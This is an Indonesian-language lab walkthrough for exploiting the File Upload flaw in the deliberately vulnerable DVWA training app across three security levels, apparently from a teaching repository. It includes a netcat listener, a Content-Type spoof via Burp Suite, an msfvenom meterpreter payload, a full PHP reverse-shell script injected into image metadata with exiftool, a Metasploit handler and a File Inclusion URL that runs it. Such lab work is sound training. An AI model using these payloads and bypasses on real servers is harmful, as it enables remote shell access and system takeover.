# File Upload
File upload vulnerabilities terjadi ketika server web mengizinkan pengguna untuk mengunggah file ke sistem tanpa memvalidasi hal-hal penting seperti nama, type, konten, atau ukurannya.

- Sebelumnya melakukan uji serangan, download terlebih dahulu file PHP reverse shell di https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php kemudian ubah IP menjadi IP Komputer yang anda gunakan dan port sesuai kebutuhan

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2023.JPG)

- Buat sebuah listener untuk terhubung ke reverse shell dan pastikan port yang digunakan sama dengan port di file php reverse shell diatas
```sh
nc -lnvp <port>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2024.JPG)

### Security Low
- Upload file **php-reverse-shell.php** ke halaman web

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2021.JPG)

- Untuk menjalankan file **php-reverse-shell.php** di server, cukup buka url tempat file tersimpan di tab baru pada browser maka netcat berhasil terhubung
```sh
http://<IP_Server>/DVWA/hackable/uploads/php-reverse-shell.php
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2022.JPG)

### Security Medium
- Gunakan tool Burp Suite untuk mengubah **Content-Type: application/x-php** menjadi **Content-Type: image/jpeg**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2025.JPG)

- Jalankan file **php-reverse-shell.php** seperti pada langkah sebelumnya

### Security High
- Siapkan sebuah file gambar apa pun dengan ukuran file dibawah 100 kb
- Buat file reverse shell PHP dengan tool msfvenom
```sh
msfvenom -p php/meterpreter/reverse_tcp lhost=IP_Attacker lport=nomor_port -f raw
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2045.JPG)

- Copy payload ke sebuah text editor, kemudian ganti karakter **'** menjadi **"** lalu tambahkan function **__halt_compiler();** dibagian paling akhir

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2046.JPG)

- Masukkan script reverse shell PHP ke dalam file gambar menggunakan tool exiftool
```sh
exiftool -DocumentName='<?php /**/ error_reporting(0); $ip = "IP_Attacker"; $port = nomor_port; if (($f = "stream_socket_client") && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = "stream"; } if (!$s && ($f = "fsockopen") && is_callable($f)) { $s = $f($ip, $port); $s_type = "stream"; } if (!$s && ($f = "socket_create") && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = "socket"; } if (!$s_type) { die("no socket funcs"); } if (!$s) { die("no socket"); } switch ($s_type) { case "stream": $len = fread($s, 4); break; case "socket": $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a["len"]; $b = ""; while (strlen($b) < $len) { switch ($s_type) { case "stream": $b .= fread($s, $len-strlen($b)); break; case "socket": $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS["msgsock"] = $s; $GLOBALS["msgsock_type"] = $s_type; if (extension_loaded("suhosin") && ini_get("suhosin.executor.disable_eval")) { $suhosin_bypass=create_function("", $b); $suhosin_bypass(); } else { eval($b); } die(); __halt_compiler();' nama_file_gambar
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2047.JPG)

- Lakukan pengecekan pada file gambar dengan exiftool
```sh
exiftool nama_file_gambar
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2048.JPG)

- Upload file gambar tersebut ke halaman **File Upload** dengan security **High**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2049.JPG)

- Buka tool metasploit dengan perintah `msfconsole` di terminal

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2050.JPG)

- Lakukan konfigurasi dibawah untuk terhubung ke shell, dan pastikan IP dan port sama dengan konfigurasi msfvenom diatas
```sh
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.100.5
set lport 9999
run
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2051.JPG)

- Buka file gambar yang sudah terupload ke server dengan menggunakan celah keamanan **File Inclusion** dengan **Security High**
```sh
http://<IP_Server>/DVWA/vulnerabilities/fi/?page=file:///var/www/html/DVWA/hackable/uploads/nama_file_gambar
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2052.JPG)

- Metasploit berhasil masuk ke dalam sistem dengan user **www-data**

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2053.JPG)
